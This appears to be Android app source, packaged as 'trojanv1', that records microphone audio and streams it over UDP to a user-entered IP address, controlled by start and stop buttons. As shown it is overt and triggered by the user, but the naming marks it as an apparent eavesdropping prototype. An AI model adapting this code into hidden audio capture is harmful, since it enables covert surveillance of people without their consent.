	package com.chilitech.trojanv1;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;

import android.app.Activity;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {
	
	 private Button startButton, stopButton;
	    private TextView textView;
	    private byte[] buffer;
	    public static DatagramSocket socket;
	    private int port=50005;
	    AudioRecord recorder = null;

	    private String ip = "";


	    private int RECORDER_SAMPLERATE = 8000;
	    private int RECORDER_CHANNELS = AudioFormat.CHANNEL_IN_MONO;
	    private int RECORDER_AUDIO_ENCODING  = AudioFormat.ENCODING_PCM_16BIT;
	    private boolean isRecording = false;

	    int minBufSize = AudioRecord.getMinBufferSize(RECORDER_SAMPLERATE, RECORDER_CHANNELS, RECORDER_AUDIO_ENCODING);

	    
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		//Components from main.xml
        startButton = (Button) findViewById (R.id.start_button);
        stopButton = (Button) findViewById (R.id.stop_button);

        textView = (TextView) findViewById(R.id.edittext);

        startButton.setOnClickListener (startListener);
        stopButton.setOnClickListener (stopListener);
	}
	
	private final OnClickListener stopListener = new OnClickListener() {

        @Override
        public void onClick(View arg0) {
            isRecording = false;
            recorder.release();
            Log.d("VS","Recorder released");
        }

    };

    private final OnClickListener startListener = new OnClickListener() {

        @Override
        public void onClick(View arg0) {
            isRecording = true;
            ip = textView.getText().toString();
            Log.d("IP", ip);
            startStreaming();
        }

    };
    
    
    public void startStreaming() {


        Thread streamThread = new Thread(new Runnable() {

            @Override
            public void run() {
                try {

                    DatagramSocket socket = new DatagramSocket();
                    Log.d("VS", "Socket Created");

                    Log.d("VS", "minBuf: " + minBufSize);
                    byte[] buffer = new byte[minBufSize];

                    Log.d("VS", "Buffer created of size " + minBufSize);
                    DatagramPacket packet;

                    final InetAddress destination = InetAddress.getByName(ip);
                    Log.d("VS", "Address retrieved");


                    recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, RECORDER_SAMPLERATE,
                            RECORDER_CHANNELS, RECORDER_AUDIO_ENCODING, minBufSize * 10);
                                                                          //500000
                    Log.d("VS", "Recorder initialized");

                    recorder.startRecording();


                    while (isRecording) {


                        //reading data from MIC into buffer
                        minBufSize = recorder.read(buffer, 0, buffer.length);

                        //putting buffer in the packet
                        packet = new DatagramPacket(buffer, buffer.length, destination, port);

                        socket.send(packet);
                        System.out.println("MinBufferSize: " + minBufSize);


                    }


                } catch(SocketException e) {
                    Log.e("SE", "Error: " + e.toString());
                } catch(UnknownHostException e) {
                    Log.e("VS", "UnknownHostException");
                } catch (IOException e) {
                    e.printStackTrace();
                    Log.e("VS", "IOException");
                }
            }

        });
        streamThread.start();
    }

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
